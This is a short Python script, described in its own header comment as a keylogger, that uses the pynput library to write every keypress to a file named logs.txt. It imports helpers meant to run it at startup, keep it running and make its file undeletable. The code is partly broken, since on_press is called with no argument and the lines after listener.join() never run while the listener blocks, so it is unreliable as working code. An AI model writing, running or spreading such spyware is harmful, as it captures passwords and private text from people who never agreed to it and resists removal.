# This code is a keylogger that captures keystrokes and saves them to a file named "logs.txt". It uses the `pynput` library to listen for keyboard events. The `on_press` function is called whenever a key is pressed, and it appends the key to the log file. The listener runs indefinitely until the program is terminated, which can be done by closing the terminal running the script.

from pynput.keyboard import Key, Listener
from test import run_forever 
from test1 import make_file_undeletable
import background_runner

def on_press(key):
    with open("logs.txt", "a") as file:
        file.write(f"{key}\n")
with Listener(on_press=on_press) as listener:
    listener.join()




background_runner.run_on_startup(on_press())
# make_file_undeletable(on_press())
run_forever(INPUT="keylogger")

# for termination of the code we have to delete the terminal running the file